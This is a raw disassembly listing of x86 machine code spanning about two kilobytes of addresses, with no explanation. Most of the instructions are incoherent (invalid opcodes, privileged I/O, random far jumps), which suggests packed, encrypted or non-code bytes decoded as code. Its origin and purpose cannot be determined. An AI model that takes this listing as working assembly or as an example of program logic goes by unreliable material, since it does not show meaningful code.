  417e8d:	imul   eax,DWORD PTR [edi],0xaad5cedf
  417e93:	dec    esp
  417e94:	sti    
  417e95:	lahf   
  417e96:	enter  0x2f73,0x20
  417e9a:	je     0x417ec7
  417e9c:	fmul   QWORD PTR [edx-0x6511e395]
  417ea2:	stos   DWORD PTR es:[edi],eax
  417ea3:	push   cs
  417ea4:	retf   
  417ea5:	sub    eax,DWORD PTR [esi+edx*4]
  417ea8:	xchg   esi,eax
  417ea9:	cmp    esi,DWORD PTR [esi+0x1d23c3eb]
  417eaf:	dec    ecx
  417eb0:	stos   DWORD PTR es:[edi],eax
  417eb1:	sub    bl,dh
  417eb3:	rcl    bl,cl
  417eb5:	or     bh,dl
  417eb7:	mov    ds:0x287e7c6,eax
  417ebc:	jl     0x417e4a
  417ebe:	push   es
  417ebf:	popa   
  417ec0:	ss setg ah
  417ec4:	rcr    bh,1
  417ec6:	les    ebp,FWORD PTR [ebp+0x50885ffb]
  417ecc:	mov    ebp,0x1ccc6179
  417ed1:	loope  0x417f42
  417ed3:	inc    ebx
  417ed4:	dec    eax
  417ed5:	stos   DWORD PTR es:[edi],eax
  417ed6:	mov    ah,0x9a
  417ed8:	xor    cl,dh
  417eda:	mov    ds:0x452a0f79,al
  417edf:	in     eax,0x16
  417ee1:	bound  edx,QWORD PTR [ebx]
  417ee3:	inc    esp
  417ee4:	aad    0x78
  417ee6:	pushf  
  417ee7:	and    BYTE PTR [ecx+eax*2],cl
  417eea:	outs   dx,DWORD PTR ds:[esi]
  417eeb:	test   DWORD PTR [edx+0x25],ecx
  417eee:	imul   edx,DWORD PTR [esi+0x1f],0x61
  417ef2:	jle    0x417ed2
  417ef4:	mov    ebx,0x1bc5be02
  417ef9:	stos   BYTE PTR es:[di],al
  417efb:	and    ecx,DWORD PTR [edx]
  417efd:	mov    ds:0xb9075850,al
  417f02:	shl    DWORD PTR [edi+0x63f1fc43],cl
  417f08:	mov    bl,0xe4
  417f0a:	fst    QWORD PTR [esi]
  417f0c:	xor    eax,0x5defc8fc
  417f11:	imul   ebp,DWORD PTR [ecx+0x77],0x9f101340
  417f18:	imul   ecx,DWORD PTR ds:0xe77b7d4e,0x6f3e05cc
  417f22:	iret   
  417f23:	mov    al,0x6c
  417f25:	mov    esi,0xa13b4b9c
  417f2a:	mov    ebp,0xc13d73ce
  417f2f:	cmp    al,0x2c
  417f31:	add    eax,0x89874e2c
  417f36:	pop    edi
  417f37:	hlt    
  417f38:	mov    bh,0x4
  417f3a:	add    al,0x2c
  417f3c:	jg     0x417f8d
  417f3e:	dec    esp
  417f3f:	call   0x5f3686e6
  417f44:	add    BYTE PTR [ebx-0xd],ch
  417f47:	test   eax,0x98e5eead
  417f4d:	pop    ebp
  417f4e:	dec    edx
  417f4f:	fs xchg esi,eax
  417f51:	mov    ds:0x943edb5b,al
  417f56:	push   ds
  417f57:	leave  
  417f58:	sbb    esi,DWORD PTR [ebx-0x1c]
  417f5b:	dec    edx
  417f5c:	cmp    BYTE PTR [esi+0x12],ch
  417f5f:	jle    0x417fb5
  417f61:	mov    eax,ds:0x889759b
  417f66:	mov    dh,0xed
  417f68:	clc    
  417f69:	imul   ecx
  417f6b:	gs test al,0xfb
  417f6e:	ins    BYTE PTR es:[edi],dx
  417f6f:	sbb    eax,0xd17aaabf
  417f74:	mov    esp,0x11f6626e
  417f79:	fwait
  417f7a:	cmp    edi,0xd1f0300a
  417f80:	pop    edi
  417f81:	and    ecx,DWORD PTR [eax-0x58]
  417f84:	mov    ch,BYTE PTR [ecx]
  417f86:	int3   
  417f87:	add    DWORD PTR [ecx-0x235576b4],0x330937a7
  417f91:	loop   0x41800f
  417f93:	pop    ebx
  417f94:	aad    0x6
  417f96:	or     BYTE PTR [esi],dl
  417f98:	xchg   ecx,eax
  417f99:	mov    ebx,0x29c4aa14
  417f9e:	mov    eax,0x752bc4ab
  417fa3:	cmc    
  417fa4:	je     0x417f97
  417fa6:	mov    cl,0x26
  417fa8:	pinsrw mm0,WORD PTR [ecx-0x7f],0x56
  417fad:	sbb    ecx,edi
  417faf:	(bad)  
  417fb0:	cmp    edx,DWORD PTR [edx+edx*2-0x6c8ffba3]
  417fb7:	push   ebx
  417fb8:	sahf   
  417fb9:	(bad)  
  417fba:	push   ebp
  417fbb:	pop    edi
  417fbc:	xchg   ebx,ebp
  417fbe:	outs   dx,BYTE PTR ds:[esi]
  417fbf:	cmp    BYTE PTR [eax+eiz*4],ch
  417fc2:	or     eax,0x3aaba6dc
  417fc7:	adc    eax,0xe6e92199
  417fcc:	sbb    eax,0x334ef3a2
  417fd1:	ror    BYTE PTR [esi],cl
  417fd3:	or     al,0xcb
  417fd6:	lea    edx,[esi+0x48]
  417fd9:	adc    al,0x4f
  417fdb:	pop    esp
  417fdc:	cmp    cl,BYTE PTR [edi+eax*8-0x246e3239]
  417fe3:	fild   WORD PTR [ecx+ecx*1]
  417fe6:	xchg   ecx,eax
  417fe7:	mov    esi,0x7ad38ba2
  417fec:	out    0x60,eax
  417fee:	aad    0x65
  417ff0:	adc    al,dl
  417ff2:	sbb    ebp,ecx
  417ff4:	xchg   esp,eax
  417ff5:	lods   eax,DWORD PTR ds:[esi]
  417ff6:	mov    eax,0x50c64933
  417ffb:	lea    eax,[ebx+0x684c5172]
  418001:	jb     0x41802c
  418003:	add    DWORD PTR [ebp+0x275b88bf],ebx
  418009:	dec    edx
  41800a:	pop    eax
  41800b:	daa    
  41800c:	sbb    al,0x33
  41800e:	mov    ebp,0x14b10f6
  418013:	lahf   
  418014:	aad    0xf1
  418016:	pop    edx
  418017:	lock push ebp
  418019:	cli    
  41801a:	mov    ds:0x4bf413,al
  41801f:	add    DWORD PTR [esi+0x1b246db6],esp
  418025:	sbb    ebp,edi
  418027:	pusha  
  418028:	adc    eax,0xb0265da1
  41802d:	push   0xffffff93
  41802f:	push   ebp
  418030:	arpl   WORD PTR ds:0x42319b75,sp
  418036:	enter  0x2a37,0xbf
  41803a:	out    dx,eax
  41803b:	out    dx,al
  41803c:	cdq    
  41803d:	inc    esi
  41803e:	pop    esi
  41803f:	and    DWORD PTR [eax+0x3],esi
  418042:	loop   0x418039
  418044:	mov    DWORD PTR [ecx+0x54e95515],esp
  41804a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41804b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804c:	dec    esp
  41804d:	pop    ecx
  41804e:	push   esi
  41804f:	jecxz  0x41803d
  418051:	xlat   BYTE PTR ds:[ebx]
  418052:	shl    BYTE PTR [edi+0x355c4da9],0x63
  418059:	pop    bx
  41805b:	pop    es
  41805c:	fs sub eax,0xa36884bd
  418062:	mov    ebp,0x40be9686
  418067:	ins    DWORD PTR es:[edi],dx
  418068:	mov    edi,ss
  41806a:	ret    
  41806b:	aas    
  41806c:	adc    esp,ebp
  41806e:	clc    
  41806f:	ds (bad) 
  418071:	fldcw  WORD PTR [esi]
  418073:	xchg   ebx,eax
  418074:	xchg   edx,eax
  418075:	std    
  418076:	push   ebx
  418077:	loope  0x41801e
  418079:	sub    BYTE PTR [esp+eiz*4],dh
  41807c:	mov    ds:0x8e0e2729,eax
  418081:	aaa    
  418082:	jo     0x4180d5
  418084:	popf   
  418085:	mov    ds:0xf288fd5,al
  41808a:	and    ah,BYTE PTR [ecx]
  41808c:	cs add eax,0x27092c51
  418092:	sub    dh,dl
  418094:	aad    0x7b
  418096:	dec    sp
  418098:	xchg   esp,eax
  418099:	jbe    0x4180e1
  41809b:	sub    dl,BYTE PTR [esi+0x85ed48c]
  4180a1:	and    bh,ch
  4180a3:	or     ch,BYTE PTR [ebp-0x80]
  4180a6:	stos   BYTE PTR es:[edi],al
  4180a7:	inc    ebx
  4180a8:	loopne 0x418038
  4180aa:	jo     0x418048
  4180ac:	sbb    eax,0xa160a2ad
  4180b1:	stos   DWORD PTR es:[edi],eax
  4180b2:	xchg   DWORD PTR [ecx-0x786f0e73],ebx
  4180b8:	xchg   edx,eax
  4180b9:	arpl   WORD PTR [ecx+0x54],di
  4180bc:	fdiv   st(5),st
  4180be:	or     DWORD PTR [edx+edi*4-0x36],ebx
  4180c2:	xchg   esp,eax
  4180c3:	scas   eax,DWORD PTR es:[edi]
  4180c4:	push   0x5f
  4180c6:	ss push eax
  4180c8:	add    al,BYTE PTR [eax-0x29a97b2c]
  4180ce:	pop    es
  4180cf:	pop    esi
  4180d0:	mov    ebx,0x241313be
  4180d5:	rcl    BYTE PTR [edx+0x78a2a340],cl
  4180db:	pop    ecx
  4180dc:	in     eax,dx
  4180dd:	adc    dh,dh
  4180df:	pusha  
  4180e0:	cmc    
  4180e1:	ins    DWORD PTR es:[edi],dx
  4180e2:	inc    ebx
  4180e3:	int3   
  4180e4:	xchg   edx,eax
  4180e5:	mov    dh,0x67
  4180e7:	aam    0x47
  4180e9:	test   eax,0x5622bd8e
  4180ee:	fmul   st,st(0)
  4180f0:	cs cmp eax,0x81a934a9
  4180f6:	jae    0x41813b
  4180f8:	inc    ebp
  4180f9:	inc    edi
  4180fa:	and    eax,0x95550649
  4180ff:	and    DWORD PTR [esi+0x4830d0db],edi
  418105:	and    al,0x3e
  418107:	lods   al,BYTE PTR ds:[esi]
  418108:	and    dl,0xc1
  41810b:	mov    bh,BYTE PTR [edi+eiz*4]
  41810e:	pop    edi
  41810f:	mov    edx,0xa2bb9e6c
  418114:	sahf   
  418115:	fimul  WORD PTR [ecx+ebx*8+0x560a64b7]
  41811c:	cmp    BYTE PTR [edx+ebp*2],ch
  41811f:	mov    fs,ecx
  418121:	add    edx,esp
  418123:	iret   
  418124:	or     dh,bl
  418126:	mov    ecx,0xc6777481
  41812b:	retf   0xd10c
  41812e:	sub    eax,0x1c14610e
  418133:	inc    ebp
  418134:	adc    esp,DWORD PTR [edi-0x56cd3c1c]
  41813a:	sbb    ecx,ecx
  41813c:	daa    
  41813d:	and    DWORD PTR [ebx+eax*8],esi
  418140:	mov    bl,0x62
  418142:	pop    esp
  418143:	jo     0x418101
  418145:	push   ebx
  418146:	cmp    ecx,edx
  418148:	pop    es
  418149:	lods   al,BYTE PTR ds:[esi]
  41814a:	pushf  
  41814b:	sub    al,0x40
  41814d:	pop    es
  41814e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41814f:	and    ebx,ebp
  418151:	jmp    0x41813f
  418153:	mov    cs,WORD PTR [edx]
  418155:	mov    ds:0x225c0134,eax
  41815a:	fdiv   QWORD PTR [ecx+eax*4+0x67fc4bd4]
  418161:	push   ss
  418162:	dec    ebp
  418163:	fnstcw WORD PTR gs:[ebp-0x2d9bfc32]
  41816a:	mov    esi,0x4719ccf7
  41816f:	jmp    0xd260:0x327ad27d
  418176:	dec    edi
  418177:	pop    ss
  418178:	shl    DWORD PTR [edx+0x1740440d],1
  41817e:	out    0x51,eax
  418180:	bound  edi,QWORD PTR [ebx+edi*4]
  418183:	sub    edx,0x16
  418186:	imul   ebx,DWORD PTR [esi+0x1ed82ad7],0x663e1041
  418190:	aas    
  418191:	into   
  418192:	xchg   ebp,eax
  418193:	sub    dh,BYTE PTR [edi+0x6621a425]
  418199:	sar    ah,0xac
  41819c:	test   DWORD PTR [ebx+eiz*2+0x27],0x8ed80fb8
  4181a4:	add    ecx,eax
  4181a6:	repz add dh,BYTE PTR ds:0x2c1f2680
  4181ad:	mov    ah,0xed
  4181af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181b0:	lar    esp,WORD PTR [ebx+0x3c]
  4181b4:	pop    edi
  4181b5:	mov    DWORD PTR [esi],edi
  4181b7:	and    eax,0x95d72607
  4181bc:	inc    ebx
  4181bd:	ja     0x418226
  4181bf:	sub    al,0xf3
  4181c1:	sbb    al,0xce
  4181c3:	in     al,dx
  4181c4:	cmp    eax,0xce69827d
  4181c9:	test   cl,bl
  4181cb:	into   
  4181cc:	mov    ds:0x1e04873f,eax
  4181d1:	mov    edi,0x33413768
  4181d6:	inc    DWORD PTR [edx-0x823b0e1]
  4181dc:	fcmove st,st(7)
  4181de:	leave  
  4181df:	lods   eax,DWORD PTR ds:[esi]
  4181e1:	iret   
  4181e2:	shr    DWORD PTR ds:0x458870fb,cl
  4181e8:	xor    ah,BYTE PTR [ecx]
  4181ea:	daa    
  4181eb:	sahf   
  4181ec:	jnp    0x4181d9
  4181ee:	std    
  4181ef:	scas   eax,DWORD PTR es:[edi]
  4181f0:	pop    edi
  4181f1:	dec    esp
  4181f2:	enter  0xcb19,0x73
  4181f6:	stos   DWORD PTR es:[edi],eax
  4181f7:	std    
  4181f8:	loope  0x4181ed
  4181fa:	inc    ebx
  4181fb:	in     eax,dx
  4181fc:	sti    
  4181fd:	sub    edi,DWORD PTR [edx]
  4181ff:	out    0xc4,al
  418201:	and    ch,ah
  418203:	lock dec edx
  418205:	pop    edi
  418206:	adc    eax,0xea011731
  41820b:	jmp    0xeceb:0x3b8aa558
  418212:	aad    0x2c
  418214:	and    BYTE PTR [ecx+0xb79ba56],ch
  41821a:	inc    esp
  41821b:	dec    eax
  41821c:	punpckldq mm3,mm0
  41821f:	jg     0x4181b5
  418221:	mov    WORD PTR [ebp+ebx*4+0x60847efe],cs
  418228:	cld    
  418229:	sbb    BYTE PTR [eax-0x5],0x54
  41822d:	(bad)  
  41822e:	adc    eax,0x151c5922
  418233:	cld    
  418234:	enter  0xb3db,0xf9
  418238:	xor    dl,BYTE PTR [ebx+0x32782b8b]
  41823e:	fs pop es
  418240:	xor    edx,eax
  418242:	xor    edi,edi
  418244:	xor    edi,DWORD PTR ds:0x42a371
  41824a:	and    DWORD PTR ds:0x42a3c9,edi
  418250:	jmp    0x418762
  418255:	int3   
  418256:	aas    
  418257:	into   
  418258:	rcl    ecx,0xd1
  41825b:	ror    ebp,cl
  41825d:	(bad)  
  41825e:	shl    DWORD PTR [eax+esi*8],1
  418261:	and    dl,BYTE PTR [ecx+esi*2]
  418264:	or     al,0x32
  418266:	fnstsw WORD PTR [edi+0x78]
  418269:	jae    0x4182e7
  41826b:	js     0x4182e5
  41826d:	jb     0x4182a6
  41826f:	mov    dl,ah
  418271:	push   es
  418272:	add    al,0x9b
  418274:	sbb    dh,BYTE PTR [esi-0x9]
  418277:	fadd   st,st(4)
  418279:	adc    DWORD PTR [ecx+0x7a6325db],ebp
  41827f:	xchg   ecx,eax
  418280:	push   ebp
  418281:	rcr    DWORD PTR [ebp-0xf24c804],0xc7
  418288:	inc    esp
  418289:	(bad)  
  41828a:	fwait
  41828b:	sub    BYTE PTR [esp+ebx*8+0x77d9986e],cl
  418292:	fdiv   QWORD PTR [ecx+0x27]
  418295:	inc    edi
  418296:	ss cmp eax,0x7701e42c
  41829c:	add    al,0xf3
  41829e:	mov    ds:0x2b35472f,eax
  4182a3:	inc    eax
  4182a4:	or     ch,ch
  4182a6:	test   DWORD PTR [edi-0x6dc306bc],ebp
  4182ac:	ds int 0x52
  4182af:	pop    ebx
  4182b0:	popa   
  4182b1:	addr16 xchg edx,eax
  4182b3:	mov    ch,0xf5
  4182b5:	dec    ebx
  4182b6:	lock dec esp
  4182b8:	fnstenv [edi]
  4182ba:	sar    BYTE PTR [eax+0x5e925de2],1
  4182c0:	ins    DWORD PTR es:[edi],dx
  4182c1:	mov    esp,0x85ef556d
  4182c6:	dec    ebp
  4182c7:	pop    esp
  4182c8:	pop    ebp
  4182c9:	jb     0x418274
  4182cb:	adc    ch,bl
  4182cd:	pop    esp
  4182ce:	out    0xe5,al
  4182d0:	addr16 cmp eax,0x407e931
  4182d6:	seto   BYTE PTR [edi+edi*8]
  4182da:	and    BYTE PTR [ecx+0x52],ch
  4182dd:	(bad)  [ebx-0x7fa75fb3]
  4182e3:	imul   edi,DWORD PTR [ebx+0x50f1a47b],0x38
  4182ea:	mov    ds:0xcc89731f,al
  4182ef:	in     al,0x1f
  4182f1:	(bad)  gs:[ecx+edx*2+0x6f]
  4182f6:	or     eax,0xe6b4e737
  4182fb:	inc    edi
  4182fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182fd:	ins    BYTE PTR es:[edi],dx
  4182fe:	mov    ah,0x91
  418300:	test   eax,0x401c54fa
  418305:	push   cs
  418306:	inc    edx
  418307:	xchg   ebp,eax
  418308:	jb     0x41833f
  41830a:	leave  
  41830b:	data16 sbb al,BYTE PTR [esi]
  41830e:	imul   ecx,DWORD PTR [ebx-0x4c0184f6],0xd106fa8e
  418318:	not    BYTE PTR ds:0xba439ed6
  41831e:	mov    ah,0x9f
  418320:	push   esi
  418321:	call   0x96d7:0x375d9d17
  418328:	test   al,0xd0
  41832a:	or     ebx,DWORD PTR [edx+ebx*4]
  41832d:	adc    ch,BYTE PTR [eax-0x2a9e15bc]
  418333:	pusha  
  418334:	or     al,0xbe
  418336:	hlt    
  418337:	and    eax,0xfeb4d5db
  41833c:	jnp    0x41834e
  41833e:	test   al,0xf8
  418340:	aad    0xd2
  418342:	inc    esi
  418343:	pushf  
  418344:	mov    edx,0xc78fe88f
  418349:	inc    ebp
  41834a:	rcl    BYTE PTR [edi+esi*2+0x1c],cl
  41834e:	aas    
  41834f:	popf   
  418350:	mov    edx,0xd48cb7f9
  418355:	jl     0x418381
  418357:	jl     0x4183c3
  418359:	fisttp WORD PTR [esi-0x53ba4d1a]
  41835f:	mov    bh,BYTE PTR [edx+0x70]
  418362:	mov    ds:0xdd504fe3,al
  418367:	inc    ebx
  418368:	gs inc esp
  41836a:	nop
  41836b:	cmp    al,0xbb
  41836d:	loopne 0x4183a8
  41836f:	aad    0x2a
  418371:	or     DWORD PTR [edx+0x76],edi
  418374:	jle    0x418313
  418376:	lea    edi,ds:0xf56da4c
  41837c:	mov    edx,0xa92213ed
  418381:	pand   mm7,mm1
  418384:	adc    ebp,DWORD PTR gs:[ebp-0x72]
  418388:	cmp    eax,0xb12beda9
  41838d:	jb     0x41832c
  41838f:	jg     0x4183d4
  418391:	mov    esi,0x413c17b6
  418396:	add    BYTE PTR [ebp-0x1de6e084],bl
  41839c:	les    eax,FWORD PTR [ebx]
  41839e:	and    ebp,DWORD PTR [edx-0x57]
  4183a1:	pusha  
  4183a2:	jns    0x418337
  4183a4:	loop   0x418424
  4183a6:	ds push ds
  4183a8:	and    ecx,DWORD PTR [eax-0x19]
  4183ab:	jmp    0x7efba117
  4183b0:	push   esi
  4183b1:	popa   
  4183b2:	mov    WORD PTR [ecx+0x7b],?
  4183b5:	sub    bh,BYTE PTR [ebx-0x62014036]
  4183bb:	push   eax
  4183bc:	cmp    al,0x7c
  4183be:	test   al,0x77
  4183c0:	sbb    eax,0xca6e6aaf
  4183c5:	push   0xffffffcc
  4183c7:	push   0x43
  4183c9:	out    0x8d,al
  4183cb:	fdivr  DWORD PTR [ecx]
  4183cd:	mov    eax,0xa41167e7
  4183d2:	inc    ebx
  4183d3:	adc    BYTE PTR [edx-0x2b],cl
  4183d6:	add    al,0xc7
  4183d8:	ja     0x41840a
  4183da:	lahf   
  4183db:	test   DWORD PTR es:[esi+ecx*1+0x4d],0xaf39c639
  4183e4:	sub    BYTE PTR [edi+esi*1-0x13],cl
  4183e8:	dec    esp
  4183e9:	(bad)  
  4183ea:	repz mov ah,0x5
  4183ed:	dec    edi
  4183ee:	sub    edx,DWORD PTR [ebp+0x43ff96ff]
  4183f4:	gs js  0x41845c
  4183f7:	fwait
  4183f8:	call   edx
  4183fa:	jno    0x418393
  4183fc:	xchg   ecx,eax
  4183fd:	mov    eax,ds:0x73eaf058
  418402:	mov    eax,0x2cedef48
  418407:	in     eax,0x90
  418409:	lock std 
  41840b:	dec    ecx
  41840c:	je     0x418396
  41840e:	enter  0x4e07,0x75
  418412:	not    DWORD PTR [edi+edx*2+0x58]
  418416:	cmp    DWORD PTR [ecx-0x7823c6af],0xffffffa6
  41841d:	cmp    BYTE PTR [ebp-0x10],bh
  418420:	xor    DWORD PTR [edi+eiz*2+0x102074f6],ebp
  418427:	outs   dx,BYTE PTR ds:[esi]
  418428:	rcl    bh,1
  41842a:	sbb    DWORD PTR [edx+0x3f],eax
  41842d:	fisubr DWORD PTR [edx]
  41842f:	ret    
  418430:	push   edi
  418431:	mov    ecx,0x558d52a
  418436:	call   0xf51da5b
  41843b:	stos   DWORD PTR es:[edi],eax
  41843c:	aas    
  41843d:	fdivr  DWORD PTR [eax+0x11e30a95]
  418443:	xchg   ebx,eax
  418444:	inc    ecx
  418445:	fwait
  418446:	pop    edi
  418447:	dec    edi
  418448:	xor    dl,BYTE PTR [ebp-0x1b]
  41844b:	ds cdq 
  41844d:	jge    0x41843a
  41844f:	mov    cl,0x93
  418451:	mov    al,0xfb
  418453:	std    
  418454:	lds    eax,FWORD PTR ds:[edx+0x1730bbec]
  41845b:	add    DWORD PTR [ebx+0x30e9470d],ebp
  418461:	imul   eax,DWORD PTR [edi-0x13004979],0x7a
  418468:	pop    es
  418469:	push   edi
  41846a:	mov    eax,ds:0xe1270a9d
  41846f:	push   0x67
  418471:	push   fs
  418473:	add    esi,DWORD PTR [edx-0x7966556]
  418479:	jns    0x4184b0
  41847b:	inc    ecx
  41847c:	sti    
  41847d:	sbb    eax,0x9e985481
  418482:	xlat   BYTE PTR ds:[ebx]
  418483:	mov    al,ds:0x8a3629db
  418488:	cmp    ah,BYTE PTR [esi+0x55]
  41848b:	xor    BYTE PTR [edi],ah
  41848d:	or     bl,BYTE PTR [ecx]
  41848f:	retf   0xb0e5
  418492:	inc    edx
  418493:	test   edi,ebp
  418495:	sbb    BYTE PTR [ebp+0x0],0x8
  418499:	fcom   DWORD PTR [eax]
  41849b:	das    
  41849c:	stc    
  41849d:	or     DWORD PTR [ebx+ebp*2-0x18986cd],esp
  4184a4:	xchg   edx,eax
  4184a5:	cmc    
  4184a6:	mov    edx,0xd5d4008a
  4184ab:	mov    ebx,0x2983d538
  4184b0:	mov    eax,ds:0x3f090e71
  4184b5:	pop    edi
  4184b6:	retf   
  4184b7:	mov    eax,ds:0xe229759d
  4184bc:	inc    eax
  4184bd:	jne    0x41844d
  4184bf:	mov    ah,0x17
  4184c1:	mov    cl,0x47
  4184c3:	cmp    ch,BYTE PTR [ecx+eiz*8-0xa99277d]
  4184ca:	jb     0x418458
  4184cc:	push   es
  4184cd:	loopne 0x418548
  4184cf:	mov    ah,0xc9
  4184d1:	mov    al,0x10
  4184d3:	popa   
  4184d4:	(bad)  [eax-0x4164a47a]
  4184da:	lahf   
  4184db:	dec    edx
  4184dc:	out    0xb0,al
  4184de:	add    DWORD PTR gs:[ecx-0x5],ebx
  4184e2:	or     DWORD PTR [ecx],edi
  4184e4:	in     al,dx
  4184e5:	(bad)  
  4184e6:	mov    DWORD PTR [edx-0x3300f577],ecx
  4184ec:	or     DWORD PTR [ecx+0x6d],ebx
  4184ef:	adc    al,0xe0
  4184f1:	pop    eax
  4184f2:	dec    edx
  4184f3:	ret    0x8255
  4184f6:	ret    
  4184f7:	add    eax,DWORD PTR [ebp-0x2e]
  4184fa:	pop    edi
  4184fb:	add    ecx,DWORD PTR [edx+0x49]
  4184fe:	xchg   esp,eax
  4184ff:	pop    esp
  418500:	jbe    0x41857a
  418502:	scas   al,BYTE PTR es:[edi]
  418503:	rcr    BYTE PTR [eax+0x6aca74ce],cl
  418509:	push   ecx
  41850a:	mov    bl,0xb1
  41850c:	push   esi
  41850d:	cs data16 stc 
  418510:	add    edi,edx
  418512:	push   ebx
  418513:	push   eax
  418514:	push   ds
  418515:	(bad)  
  418516:	xchg   edx,eax
  418517:	adc    DWORD PTR [edx-0x30],ebx
  41851a:	leave  
  41851b:	ins    DWORD PTR es:[edi],dx
  41851c:	add    cl,bh
  41851e:	mov    edi,0x69d6e4a5
  418523:	inc    ebp
  418524:	ss rol eax,1
  418527:	scas   eax,DWORD PTR es:[edi]
  418528:	sub    al,0x18
  41852a:	test   al,0xac
  41852c:	dec    edi
  41852d:	dec    edi
  41852e:	cmp    BYTE PTR [edi-0x22],bh
  418531:	lds    esi,FWORD PTR [ebp+0x5d435edb]
  418537:	(bad)  
  418538:	jmp    0x4185a2
  41853a:	das    
  41853b:	cmc    
  41853c:	stos   DWORD PTR es:[edi],eax
  41853d:	lock inc esi
  41853f:	cmp    al,0x2a
  418541:	int3   
  418542:	sbb    dh,BYTE PTR [esi-0xb919d96]
  418548:	cli    
  418549:	fadd   QWORD PTR ds:0x48483606
  41854f:	add    ch,BYTE PTR [ebp+0x2e]
  418552:	ss das 
  418554:	adc    dl,BYTE PTR [edi]
  418556:	lahf   
  418557:	es cmp ebx,ebp
  41855a:	clc    
  41855b:	mov    cl,0x27
  41855d:	sti    
  41855e:	out    0x3f,al
  418560:	add    eax,DWORD PTR [edi]
  418562:	int3   
  418563:	fs xchg esp,eax
  418565:	fbstp  TBYTE PTR [edx]
  418567:	mov    dh,0xbe
  418569:	mov    ecx,0xdea3063c
  41856e:	sbb    ecx,edx
  418570:	xchg   esi,eax
  418571:	inc    edx
  418572:	xchg   edx,eax
  418573:	fist   WORD PTR [esi]
  418575:	add    ebx,DWORD PTR [edx+0x5e]
  418578:	aaa    
  418579:	icebp  
  41857a:	jns    0x41854f
  41857c:	test   eax,0xc7e3811b
  418581:	shr    DWORD PTR [edi+esi*1],0xdb
  418585:	hlt    
  418586:	lods   al,BYTE PTR ds:[esi]
  418587:	adc    al,0x42
  418589:	mov    edx,0x3ec1da77
  41858e:	mov    DWORD PTR [ebx],ebp
  418590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418591:	loopne 0x4185ba
  418593:	adc    ch,ah
  418595:	mov    dl,0x44
  418598:	add    bh,dl
  41859a:	sbb    al,0xb0
  41859c:	cs (bad) 
  41859e:	push   esp
  41859f:	push   cs
  4185a0:	push   0x73
  4185a2:	sub    cl,BYTE PTR [ecx+0x4]
  4185a5:	jae    0x41853f
  4185a7:	sbb    eax,0x8a9df145
  4185ac:	hlt    
  4185ad:	mov    eax,edx
  4185af:	lock jns 0x4185e7
  4185b2:	shl    eax,cl
  4185b4:	adc    cl,dh
  4185b6:	aaa    
  4185b7:	inc    edx
  4185b8:	sbb    al,0x4
  4185ba:	(bad)  
  4185bb:	jo     0x4185cc
  4185bd:	sub    eax,0xb5a1fe4c
  4185c2:	stos   DWORD PTR es:[edi],eax
  4185c3:	loopne 0x4185a4
  4185c5:	call   0x207d:0x3b86bc93
  4185cc:	fisub  WORD PTR [edx-0x2546383e]
  4185d2:	push   es
  4185d3:	ja     0x4185a1
  4185d5:	push   DWORD PTR ds:0xd233b07c
  4185db:	adc    BYTE PTR [ebp-0x27],bl
  4185de:	cmp    eax,0xbd51f4eb
  4185e3:	fmul   st,st(0)
  4185e5:	pushf  
  4185e6:	jle    0x4185ec
  4185e8:	cmp    edx,DWORD PTR [ebx]
  4185ea:	lds    ebp,FWORD PTR [ecx+0x73b112f2]
  4185f0:	sar    DWORD PTR [edi+esi*4+0x58537e7f],0xda
  4185f8:	push   ds
  4185f9:	lea    edx,[esi]
  4185fb:	jecxz  0x418644
  4185fd:	fld    DWORD PTR [edx-0x2a]
  418600:	ror    BYTE PTR [esp+eiz*4-0x12],cl
  418604:	mov    eax,0xe000cccb
  418609:	rol    DWORD PTR [ebx+ebp*4-0x3c01a8fc],cl
  418610:	sub    bh,bl
  418612:	jecxz  0x4185fa
  418614:	mov    ds:0x1dfb8cf7,eax
  418619:	rcl    DWORD PTR [edi-0x25],0x91
  41861d:	and    DWORD PTR [ebx],ecx
  41861f:	ja     0x41868d
  418621:	call   0xec6496a
  418626:	cwde   
  418627:	push   ecx
  418628:	ds popf 
  41862a:	jp     0x418693
  41862c:	in     al,dx
  41862d:	or     eax,0xd39ed66b
  418632:	pop    ecx
  418633:	add    eax,0x312b8888
  418638:	sub    eax,0x742a7f5f
  41863d:	daa    
  41863e:	and    DWORD PTR [ebx-0x7e],edx
  418641:	(bad)  
  418643:	and    al,0xf2
  418645:	inc    ebp
  418646:	clc    
  418647:	mov    dl,0x12
  418649:	fst    QWORD PTR [eax-0x46cabfd3]
  41864f:	pop    esp
  418650:	(bad)  
  418651:	(bad)  
  418652:	sbb    al,0x98
  418654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418655:	cmp    edx,DWORD PTR gs:[ecx+ebx*4]
  418659:	jb     0x418653
  41865b:	out    dx,eax
  41865c:	jnp    0x418681
  41865e:	xor    al,BYTE PTR [edx]
  418660:	jecxz  0x4185f6
  418662:	lock inc eax
  418664:	popf   
  418665:	sbb    al,0x8
  418667:	shr    DWORD PTR [ecx+0x754cf10d],0x5e
  41866e:	pop    edi
  41866f:	rcr    DWORD PTR [ebp+0x16],cl
  418672:	leave  
  418673:	lock sub al,0xf3
  418676:	jo     0x418613
  418678:	inc    esi
  418679:	pop    edx
  41867a:	aad    0xb6
  41867c:	or     eax,0xd839be57
  418681:	cmp    eax,0x9796c147
  418686:	xchg   ecx,eax
  418687:	cmp    al,0xa1
  418689:	jmp    0xb26e:0x6b8a07c2
  418690:	jg     0x418640
  418692:	fsubr  QWORD PTR [eax]
  418694:	jns    0x4186a9
  418696:	pop    es
  418697:	cmp    bh,dl
  418699:	aam    0x31
  41869b:	pop    ds
  41869c:	sbb    BYTE PTR [eax],0x70
  41869f:	(bad)  
  4186a0:	mov    eax,0x1f79d6aa
  4186a5:	cdq    
  4186a6:	dec    BYTE PTR [esi]
  4186a8:	inc    eax
  4186a9:	xor    dh,ah
  4186ab:	or     BYTE PTR [eax-0x43261946],al
  4186b1:	mov    fs,edi
  4186b3:	test   DWORD PTR [esi],edi
  4186b5:	or     eax,0x17ab0ae2
  4186ba:	fistp  WORD PTR ds:[edi-0x11931956]
  4186c1:	test   eax,0x9943eda0
  4186c6:	lahf   
  4186c7:	xchg   ebx,eax
  4186c8:	into   
  4186c9:	pop    esi
